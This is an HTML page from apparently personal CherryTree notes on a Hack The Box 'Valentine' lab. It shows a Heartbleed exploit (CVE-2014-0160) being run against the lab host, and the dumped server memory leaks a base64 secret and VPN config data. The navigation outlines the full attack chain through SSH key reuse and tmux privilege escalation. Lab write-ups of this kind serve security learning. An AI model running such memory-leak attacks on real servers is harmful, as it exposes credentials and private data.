@@ -1,0 +1,64 @@
+<!doctype html><html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>heartbleed.py <target ip> -n 20</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="styles.css" type="text/css" />
+</head>
+<body><div class="main"><div class="tree">
+<p><strong>Index</strong></p>
+<p><a href="HacktheBox--Linux_Boxes--valentine.html">valentine</a></p>
+
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--valentine--nmap.html">nmap</a></li>
+<li><a href="HacktheBox--Linux_Boxes--valentine--http.html">http</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--valentine--http--gobuster.html">gobuster</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--valentine--http--gobuster---index.html">/index</a></li>
+<li><a href="HacktheBox--Linux_Boxes--valentine--http--gobuster---dev.html">/dev</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--valentine--http--gobuster---dev--hype_key.html">hype_key</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--valentine--http--gobuster---dev--hype_key--hex_to_ascii.html">hex to ascii</a></li>
+<li><a href="HacktheBox--Linux_Boxes--valentine--http--gobuster---dev--hype_key--vi_hype_key.html">vi hype_key</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--valentine--http--gobuster---dev--notes.txt.html">notes.txt</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--valentine--http--gobuster---encode.html">/encode</a></li>
+<li><a href="HacktheBox--Linux_Boxes--valentine--http--gobuster---decode.html">/decode</a></li>
+<li><a href="HacktheBox--Linux_Boxes--valentine--http--gobuster---omg.html">/omg</a></li>
+</ol>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--valentine--initial_foothold_w-_heartbleed.html">initial foothold w/ heartbleed</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--valentine--initial_foothold_w-_heartbleed--Heartbleed_concept_comic.html">Heartbleed concept comic</a></li>
+<li><a href="HacktheBox--Linux_Boxes--valentine--initial_foothold_w-_heartbleed--vi_heartbleed.py.html">vi heartbleed.py</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--valentine--initial_foothold_w-_heartbleed--vi_heartbleed.py--heartbleed.py_sourcecode.html">heartbleed.py sourcecode</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--valentine--initial_foothold_w-_heartbleed--run_heartbleeed.html">run heartbleeed</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--valentine--initial_foothold_w-_heartbleed--run_heartbleeed--usage.html">usage </a></li>
+<li><a href="HacktheBox--Linux_Boxes--valentine--initial_foothold_w-_heartbleed--run_heartbleeed--heartbleed.py_target_ip_-n_20.html">heartbleed.py <target ip> -n 20</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--valentine--initial_foothold_w-_heartbleed--run_heartbleeed--heartbleed.py_target_ip_-n_20--interesting_finds.html">interesting finds</a></li>
+<li><a href="HacktheBox--Linux_Boxes--valentine--initial_foothold_w-_heartbleed--run_heartbleeed--heartbleed.py_target_ip_-n_20--base_64_text.html">base 64 text</a></li>
+</ol>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--valentine--initial_foothold_w-_heartbleed--ssh_-i_hype_key_hype@10.10.10.79.html">ssh -i hype_key hype@10.10.10.79</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--valentine--priv_esc.html">priv esc</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--valentine--priv_esc--linux_smart_enumeration.html">linux smart enumeration</a></li>
+<li><a href="HacktheBox--Linux_Boxes--valentine--priv_esc--notes.html">notes</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--valentine--priv_esc--notes--ps_-ef__grep_root.html">ps -ef | grep root</a></li>
+<li><a href="HacktheBox--Linux_Boxes--valentine--priv_esc--notes--log_onto_root_tmux_session.html">log onto root tmux session</a></li>
+</ol>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--valentine--user-root.html">user/root</a></li>
+<li><a href="HacktheBox--Linux_Boxes--valentine--lessons_learned.html">lessons learned</a></li>
+</ol></div>
+<div class="page"><h1><b><u>heartbleed.py <target ip> -n 20</u></b></h1><img src="images/2043-1.png" alt="images/2043-1.png" /><br /><br /><span style="color:#ffa500;">python heartbleed.py 10.10.10.79 -n 20</span><br /><br />defribulator v1.16<br />A tool to test and exploit the TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)<br /><br />##################################################################<br />Connecting to: 10.10.10.79:443, 20 times<br />Sending Client Hello for TLSv1.0<br />Received Server Hello for TLSv1.0<br /><br />WARNING: 10.10.10.79:443 returned more data than it should - server is vulnerable!<br />Please wait... connection attempt 20 of 20<br />##################################################################<br /><br />.@....SC[...r....+..H...9...<br />....w.3....f...<br />...!.9.8.........5...............<br />.........3.2.....E.D...../...A.................................I.........<br />...........<br />...................................#.......0.0.1/decode.php<br />Content-Type: application/x-www-form-urlencoded<br />Content-Length: 42<br /><br />$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==.%...l1..l.[.f4.@....SC[...r....+..H...9...<br />....w.3....f...<br />...!.9.8.........5...............<br />.........3.2.....E.D...../...A.................................I.........<br />...........<br />...................................#.@....SC[...r....+..H...9...<br />....w.3....f...<br />...!.9.8.........5...............<br />.........3.2.....E.D...../...A.................................I.........<br />...........<br />...................................#.@....SC[...r....+..H...9...<br />....w.3....f...<br />...!.9.8.........5...............<br />.........3.2.....E.D...../...A.................................I.........<br />...........<br />...................................#.@....SC[...r....+..H...9...<br />....w.3....f...<br />...!.9.8.........5...............<br />.........3.2.....E.D...../...A.................................I.........<br />...........<br />...................................#.@....SC[...r....+..H...9...<br />....w.3....f...<br />...!.9.8.........5...............<br />.........3.2.....E.D...../...A.................................I.........<br />...........<br />.*.(...............................#.......Y.... &lt;...,.L.O....:..........88...Ia.aG.S........<br />...........................+........-.....3.&amp;.$... }..-...A.sd......c.@v...1.nb.oY$.@....SC[...r....+..H...9...<br />....w.3....f...<br />...!.9.8.........5...............<br />.........3.2.....E.D...../...A.................................I.........<br />...........<br />...................................#.......0.0.1/decode.php<br />Content-Type: application/x-www-form-urlencoded<br />Content-Length: 42<br /><br />$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==.%...l1..l.[.f4.@....SC[...r....+..H...9...<br />....w.3....f...<br />...!.9.8.........5...............<br />.........3.2.....E.D...../...A.................................I.........<br />...........<br />...................................#.......9<br />X-AnyConnect-Platform: mac-intel<br /><br />&lt;?xml version="1.0" encoding="UTF-8"?&gt;<br />&lt;config-auth client="vpn" type="init" aggregate-auth-version="2"&gt;<br />&lt;version who="vpn"&gt;3.1.05160&lt;/version&gt;<br />&lt;device-id device-type="MacBookAir4,1" platform-version="10.9.2" unique-id="AD2E502557D3FFE604A662DAFFCC3B3D86CE6E3C50F5FEB0267885384F48B853E215151761C5F862EDA72D07D4F8C5CB8E09420A3D0356544FC7DCFB0E4D418C"&gt;mac-intel&lt;/device-id&gt;<br />&lt;mac-address-list&gt;<br />&lt;mac-address&gt;fe:cb:03:74:e1:fd&lt;/mac-address&gt;&lt;/mac-address-list&gt;<br />&lt;group-select&gt;VPN&lt;/group-select&gt;<br />&lt;group-access&gt;<a href="https://10.10.10.79:443</group-access>">https://10.10.10.79:443&lt;/group-access&gt;</a><br />.@....SC[...r....+..H...9...*..Mn.<br />....w.3....f...<br />...!.9.8.........5...............<br />.........3.2.....E.D...../...A.................................I.........<br />...........<br />...................................#.@....SC[...r....+..H...9...<br />....w.3....f...<br />...!.9.8.........5...............<br />.........3.2.....E.D...../...A.................................I.........<br />...........<br />...................................#.......0.79<br /><br />.*.(.......................$N..........<br />8.#.Dt.0.E.d.+.,.y[X.......JgedObjectReference" type="ServiceInstance"&gt;ServiceInstance&lt;/_this&gt;&lt;/RetrieveServiceContent&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt; 15O...{..K.....w..'.@....SC[...r....+..H...9...<br />....w.3....f...<br />...!.9.8.........5...............<br />.........3.2.....E.D...../...A.................................I.........<br />...........<br />...................................#.......0.0.1/decode.php<br />Content-Type: application/x-www-form-urlencoded<br />Content-Length: 42<br /><br />$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==KH.L..e..q.q.U..M.0.@....SC[...r....+..H...9...<br />....w.3....f...<br />...!.9.8.........5...............<br />.........3.2.....E.D...../...A.................................I.........<br />...........<br />...................................#.@....SC[...r....+..H...9...<br />....w.3....f...<br />...!.9.8.........5...............<br />.........3.2.....E.D...../...A.................................I.........<br />...........<br />...................................#.@....SC[...r....+..H...9...<br />....w.3....f...<br />...!.9.8.........5...............<br />.........3.2.....E.D...../...A.................................I.........<br />...........<br />.*.(...............................#.......Y.... &lt;...,.L.O....:..........88...Ia.aG.S........<br />...........................+........-.....3.&amp;.$... }..-...A.sd......c.@v...1.nb.oY$.@....SC[...r....+..H...9...<br />....w.3....f...<br />...!.9.8.........5...............<br />.........3.2.....E.D...../...A.................................I.........<br />...........<br />...................................#.@....SC[...r....+..H...9...<br />....w.3....f...<br />...!.9.8.........5...............<br />.........3.2.....E.D...../...A.................................I.........<br />...........<br />...................................#.......0.0.1/decode.php<br />Content-Type: application/x-www-form-urlencoded<br />Content-Length: 42<br /><br />$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==KH.L..e..q.q.U..M.0.@....SC[...r....+..H...9...<br />....w.3....f...<br />...!.9.8.........5...............<br />.........3.2.....E.D...../...A.................................I.........<br />...........<br />...................................#.@....SC[...r....+..H...9...<br />....w.3....f...<br />...!.9.8.........5...............<br />.........3.2.....E.D...../...A.................................I.........<br />...........<br />...................................#.@....SC[...r....+..H...9...<br />....w.3....f...<br />...!.9.8.........5...............<br />.........3.2.....E.D...../...A.................................I.........<br />...........<br />.*.(...............................#.......Y.... &lt;...,.L.O....:..........88...Ia.aG.S........<br />...........................+........-.....3.&amp;.$... }..-...A.sd......c.@v...1.nb.oY$.@....SC[...r....+..H...9...<br />....w.3....f...<br />...!.9.8.........5...............<br />.........3.2.....E.D...../...A.................................I.........<br />...........<br />...................................#<br /></div></div>
+</body></html>
